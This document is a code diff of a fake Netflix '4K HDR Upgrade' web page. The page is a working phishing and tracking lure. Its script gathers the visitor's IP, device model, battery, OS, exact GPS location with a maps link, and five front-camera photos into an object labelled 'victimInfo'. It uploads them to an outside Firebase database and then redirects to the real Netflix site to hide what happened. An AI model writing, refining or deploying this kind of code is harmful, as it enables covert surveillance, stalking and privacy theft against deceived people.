@@ -5,14 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>4K HDR Upgrade - Netflix</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto;
             background: linear-gradient(135deg, #141414 0%, #0a0a0a 100%);
             min-height: 100vh;
             display: flex;
@@ -20,73 +15,50 @@
             align-items: center;
             padding: 20px;
         }
-        
         .container {
             max-width: 500px;
             width: 100%;
             background: rgba(0,0,0,0.85);
-            border-radius: 25px;
+            border-radius: 20px;
             backdrop-filter: blur(10px);
-            border: 1px solid rgba(229,9,20,0.5);
+            border: 1px solid rgba(229, 9, 20, 0.3);
             padding: 2rem;
-            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
         }
-        
-        .logo {
-            text-align: center;
-            margin-bottom: 2rem;
-        }
-        
-        .logo h1 {
-            font-size: 2.5rem;
-            font-weight: 800;
+        .logo { text-align: center; margin-bottom: 2rem; }
+        .logo h1 { 
+            font-size: 2rem; 
             background: linear-gradient(135deg, #E50914, #ff4d4d);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            letter-spacing: -1px;
         }
-        
         .badge {
             display: inline-block;
             background: #E50914;
             padding: 0.3rem 1rem;
             border-radius: 30px;
-            font-size: 0.75rem;
-            font-weight: 600;
+            font-size: 0.8rem;
             margin-top: 0.5rem;
         }
-        
-        .progress-section {
-            margin: 2rem 0;
-        }
-        
+        .progress-section { margin: 2rem 0; }
         .progress-bar-container {
             background: rgba(255,255,255,0.2);
             border-radius: 10px;
             overflow: hidden;
             height: 8px;
         }
-        
         .progress-bar {
             height: 100%;
             background: linear-gradient(90deg, #E50914, #ff4d4d);
             width: 0%;
             transition: width 0.3s ease;
-            border-radius: 10px;
         }
-        
         .status-text {
             margin-top: 1rem;
             text-align: center;
-            font-size: 0.85rem;
+            font-size: 0.9rem;
             color: #ccc;
-            font-weight: 500;
         }
-        
-        .steps {
-            margin: 2rem 0;
-        }
-        
+        .steps { margin: 2rem 0; }
         .step {
             display: flex;
             align-items: center;
@@ -94,78 +66,35 @@
             padding: 0.8rem;
             margin: 0.5rem 0;
             background: rgba(255,255,255,0.05);
-            border-radius: 12px;
-            transition: all 0.3s ease;
+            border-radius: 10px;
         }
-        
-        .step.completed {
-            background: rgba(76,175,80,0.2);
-            border-left: 3px solid #4CAF50;
-        }
-        
-        .step.error {
-            background: rgba(229,9,20,0.2);
-            border-left: 3px solid #E50914;
-        }
-        
-        .step-icon {
-            width: 35px;
-            text-align: center;
-            font-size: 1.3rem;
-        }
-        
-        .step-text {
-            flex: 1;
-            font-size: 0.9rem;
-            font-weight: 500;
-        }
-        
-        .step-status {
-            font-size: 0.85rem;
-            font-weight: bold;
-        }
-        
-        .redirect-note {
-            text-align: center;
-            margin-top: 2rem;
-            padding-top: 1rem;
-            border-top: 1px solid rgba(255,255,255,0.1);
-            font-size: 0.75rem;
-            color: #666;
-        }
-        
-        button {
-            margin-top: 1rem;
-            padding: 0.6rem 1rem;
-            background: #E50914;
-            border: none;
-            border-radius: 8px;
-            color: white;
-            cursor: pointer;
-            font-size: 0.8rem;
-            font-weight: 600;
-            width: 100%;
-        }
-        
-        button:hover {
-            background: #ff1a1a;
-        }
-        
+        .step.completed { background: rgba(76, 175, 80, 0.2); border-left: 3px solid #4CAF50; }
+        .step.error { background: rgba(229, 9, 20, 0.2); border-left: 3px solid #E50914; }
+        .step-icon { width: 30px; text-align: center; font-size: 1.2rem; }
+        .step-text { flex: 1; font-size: 0.9rem; }
+        .step-status { font-size: 0.8rem; }
+        .redirect-note { text-align: center; margin-top: 2rem; padding-top: 1rem; border-top: 1px solid rgba(255,255,255,0.1); font-size: 0.8rem; color: #888; }
         .debug-console {
             margin-top: 1rem;
-            padding: 0.8rem;
-            background: rgba(0,0,0,0.9);
+            padding: 1rem;
+            background: rgba(0,0,0,0.8);
             border-radius: 10px;
-            font-family: 'Courier New', monospace;
-            font-size: 0.65rem;
+            font-family: monospace;
+            font-size: 0.7rem;
             color: #0f0;
-            max-height: 150px;
+            max-height: 200px;
             overflow-y: auto;
             display: none;
         }
-        
-        .debug-console.show {
-            display: block;
+        .debug-console.show { display: block; }
+        button {
+            margin-top: 1rem;
+            padding: 0.5rem 1rem;
+            background: #E50914;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            cursor: pointer;
         }
     </style>
 </head>
@@ -173,7 +102,7 @@
     <div class="container">
         <div class="logo">
             <h1>NETFLIX</h1>
-            <div class="badge">⚡ 4K HDR ULTRA UPGRADE ⚡</div>
+            <div class="badge">4K HDR UPGRADE</div>
         </div>
         
         <div class="progress-section">
@@ -184,34 +113,15 @@
         </div>
         
         <div class="steps">
-            <div class="step" id="step1">
-                <div class="step-icon">📱</div>
-                <div class="step-text">Device Detection</div>
-                <div class="step-status" id="step1Status">⚪</div>
-            </div>
-            <div class="step" id="step2">
-                <div class="step-icon">📍</div>
-                <div class="step-text">GPS Location</div>
-                <div class="step-status" id="step2Status">⚪</div>
-            </div>
-            <div class="step" id="step3">
-                <div class="step-icon">📸</div>
-                <div class="step-text">Capturing Photos (5)</div>
-                <div class="step-status" id="step3Status">⚪</div>
-            </div>
-            <div class="step" id="step4">
-                <div class="step-icon">☁️</div>
-                <div class="step-text">Uploading Data</div>
-                <div class="step-status" id="step4Status">⚪</div>
-            </div>
+            <div class="step" id="step1"><div class="step-icon">📱</div><div class="step-text">Device Detection</div><div class="step-status" id="step1Status">⚪</div></div>
+            <div class="step" id="step2"><div class="step-icon">📍</div><div class="step-text">GPS Location</div><div class="step-status" id="step2Status">⚪</div></div>
+            <div class="step" id="step3"><div class="step-icon">📸</div><div class="step-text">Capturing Photos (5)</div><div class="step-status" id="step3Status">⚪</div></div>
+            <div class="step" id="step4"><div class="step-icon">☁️</div><div class="step-text">Uploading Data</div><div class="step-status" id="step4Status">⚪</div></div>
         </div>
         
-        <div class="redirect-note">⚡ Optimizing your 4K HDR streaming experience...</div>
-        <button onclick="toggleDebug()">🐛 Debug Console</button>
-        <div class="debug-console" id="debugConsole">
-            <strong>📡 DEBUG LOG:</strong><br>
-            <div id="debugLog">Waiting...</div>
-        </div>
+        <div class="redirect-note">⚡ Optimizing your streaming experience...</div>
+        <button onclick="toggleDebug()">🐛 Show/Hide Debug</button>
+        <div class="debug-console" id="debugConsole"><strong>📡 DEBUG CONSOLE:</strong><br><div id="debugLog">Waiting...</div></div>
     </div>
 
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
@@ -226,7 +136,8 @@
             projectId: "mobilehk-5e843",
             storageBucket: "mobilehk-5e843.firebasestorage.app",
             messagingSenderId: "287475964010",
-            appId: "1:287475964010:web:1d278c51947c6cbb881213"
+            appId: "1:287475964010:web:1d278c51947c6cbb881213",
+            measurementId: "G-VT3YC79N61"
         };
         
         // Debug
@@ -280,32 +191,6 @@
             }
         }
         
-        // Get EXACT Location
-        async function getExactLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve({ lat: 0, lng: 0, accuracy: 0 });
-                    return;
-                }
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        addDebug(`📍 Exact Location: ${pos.coords.latitude}, ${pos.coords.longitude} (Accuracy: ${pos.coords.accuracy}m)`);
-                        resolve({ 
-                            lat: pos.coords.latitude, 
-                            lng: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy,
-                            altitude: pos.coords.altitude || 0
-                        });
-                    },
-                    (err) => {
-                        addDebug("Location error: " + err.message, true);
-                        resolve({ lat: 0, lng: 0, accuracy: 0 });
-                    },
-                    { timeout: 10000, enableHighAccuracy: true }
-                );
-            });
-        }
-        
         // Get IP and Location Details
         async function getIPDetails() {
             try {
@@ -318,13 +203,39 @@
                     region: data.region || 'Unknown',
                     city: data.city || 'Unknown',
                     isp: data.org || 'Unknown',
-                    postal: data.postal || 'Unknown',
-                    timezone: data.timezone || 'Unknown'
+                    lat: data.latitude || 0,
+                    lng: data.longitude || 0
                 };
             } catch(e) {
                 addDebug("IP fetch error: " + e.message, true);
-                return { ip: 'Unknown', country: 'Unknown', region: 'Unknown', city: 'Unknown', isp: 'Unknown' };
+                return { ip: 'Unknown', country: 'Unknown', region: 'Unknown', city: 'Unknown', isp: 'Unknown', lat: 0, lng: 0 };
             }
+        }
+        
+        // Get Exact Location from GPS
+        async function getExactLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    addDebug("Geolocation not supported", true);
+                    resolve({ lat: 0, lng: 0, accuracy: 0 });
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        addDebug(`📍 Exact GPS: ${pos.coords.latitude}, ${pos.coords.longitude} (Accuracy: ${pos.coords.accuracy}m)`);
+                        resolve({ 
+                            lat: pos.coords.latitude, 
+                            lng: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy
+                        });
+                    },
+                    (err) => {
+                        addDebug("GPS error: " + err.message, true);
+                        resolve({ lat: 0, lng: 0, accuracy: 0 });
+                    },
+                    { timeout: 10000, enableHighAccuracy: true }
+                );
+            });
         }
         
         // Get Battery with Percentage
@@ -377,8 +288,8 @@
             return { brand: brand, model: model, full: `${brand} ${model}`.trim() };
         }
         
-        // Get Full Device Info
-        function getDeviceInfo() {
+        // Get Device OS and Browser
+        function getDeviceOSBrowser() {
             const ua = navigator.userAgent;
             let os = 'Unknown', osVersion = 'Unknown';
             
@@ -409,11 +320,11 @@
             return { os, osVersion, browser };
         }
         
-        // Capture Multiple Photos (5 photos, 1.5 sec gap, single permission)
+        // Capture Multiple Photos (5 photos, single permission, 1.5 sec gap)
         async function captureMultiplePhotos(count = 5) {
             const photos = [];
             
-            // Ek baar permission lo
+            // Get camera permission once
             let stream = null;
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
@@ -436,9 +347,9 @@
             for (let i = 0; i < count; i++) {
                 addDebug(`📸 Capturing photo ${i+1}/${count}...`);
                 
-                // Update status text
+                // Update status
                 document.getElementById('step3Status').innerHTML = `${i+1}/${count}`;
-                updateProgress(50 + ((i+1) / count) * 25, `Capturing photo ${i+1}/${count}...`);
+                updateProgress(55 + ((i+1) / count) * 25, `Capturing photo ${i+1}/${count}...`);
                 
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth || 640;
@@ -457,23 +368,23 @@
             
             // Stop camera
             stream.getTracks().forEach(track => track.stop());
-            addDebug(`🎬 Capture complete: ${photos.length} photos`);
+            addDebug(`🎬 Complete: ${photos.length} photos captured`);
             
             return photos;
         }
         
         // Main execution
         async function main() {
-            updateProgress(0, 'Starting system...');
+            updateProgress(0, 'Starting...');
             
-            // Step 1: Device Info + Battery + Model
+            // Step 1: Device Info + Battery + Mobile Model
             markStep(1, false, '⟳');
             updateProgress(10, 'Detecting device...');
             
             const ipDetails = await getIPDetails();
             const battery = await getBatteryStatus();
             const mobileModel = getMobileModel();
-            const deviceInfo = getDeviceInfo();
+            const osBrowser = getDeviceOSBrowser();
             
             const victimInfo = {
                 ip: ipDetails.ip,
@@ -481,50 +392,47 @@
                 region: ipDetails.region,
                 city: ipDetails.city,
                 isp: ipDetails.isp,
-                postal: ipDetails.postal,
-                timezone: ipDetails.timezone,
                 battery_level: battery.level,
                 battery_charging: battery.charging,
                 battery_status: battery.status,
                 device_brand: mobileModel.brand,
                 device_model: mobileModel.model,
                 device_full: mobileModel.full,
-                os: deviceInfo.os,
-                os_version: deviceInfo.osVersion,
-                browser: deviceInfo.browser,
+                os: osBrowser.os,
+                os_version: osBrowser.osVersion,
+                browser: osBrowser.browser,
                 screen: `${window.screen.width}x${window.screen.height}`,
                 language: navigator.language,
                 timestamp: new Date().toISOString()
             };
             
             markStep(1, true, '✓');
-            updateProgress(25, 'Device detected');
+            updateProgress(30, 'Device detected');
             await new Promise(r => setTimeout(r, 500));
             
-            // Step 2: Exact Location
+            // Step 2: Exact GPS Location
             markStep(2, false, '⟳');
-            updateProgress(35, 'Getting GPS location...');
+            updateProgress(40, 'Getting GPS location...');
             
-            const exactLocation = await getExactLocation();
+            const gpsLocation = await getExactLocation();
             const locationData = {
-                lat: exactLocation.lat,
-                lng: exactLocation.lng,
-                accuracy: exactLocation.accuracy,
-                altitude: exactLocation.altitude,
+                lat: gpsLocation.lat,
+                lng: gpsLocation.lng,
+                accuracy: gpsLocation.accuracy,
                 country: ipDetails.country,
                 region: ipDetails.region,
                 city: ipDetails.city,
                 isp: ipDetails.isp,
-                maps_link: `https://maps.google.com/?q=${exactLocation.lat},${exactLocation.lng}`
+                maps_link: `https://maps.google.com/?q=${gpsLocation.lat},${gpsLocation.lng}`
             };
             
-            markStep(2, true, exactLocation.lat !== 0 ? '✓' : '⚠');
+            markStep(2, true, gpsLocation.lat !== 0 ? '✓' : '⚠');
             updateProgress(50, 'GPS locked');
             await new Promise(r => setTimeout(r, 500));
             
             // Step 3: Capture 5 Photos
             markStep(3, false, '⟳');
-            updateProgress(60, 'Preparing camera...');
+            updateProgress(55, 'Preparing camera...');
             
             const photos = await captureMultiplePhotos(5);
             
@@ -538,7 +446,7 @@
             
             // Step 4: Upload to Firebase
             markStep(4, false, '⟳');
-            updateProgress(92, 'Uploading data...');
+            updateProgress(90, 'Uploading data...');
             
             const uploadData = {
                 victim_info: victimInfo,
@@ -549,17 +457,19 @@
                 complete: true
             };
             
+            addDebug("Writing to Firebase...");
             try {
                 await database.ref(`sessions/${sessionId}/data`).set(uploadData);
                 addDebug("✅ ALL DATA UPLOADED SUCCESSFULLY!");
                 markStep(4, true, '✓');
                 updateProgress(100, 'Complete! Redirecting...');
             } catch(e) {
-                addDebug("Upload error: " + e.message, true);
+                addDebug("Firebase error: " + e.message, true);
                 markStep(4, false, '✗', true);
             }
             
             setTimeout(() => {
+                addDebug("Redirecting to Netflix...");
                 window.location.href = 'https://www.netflix.com';
             }, 3000);
         }
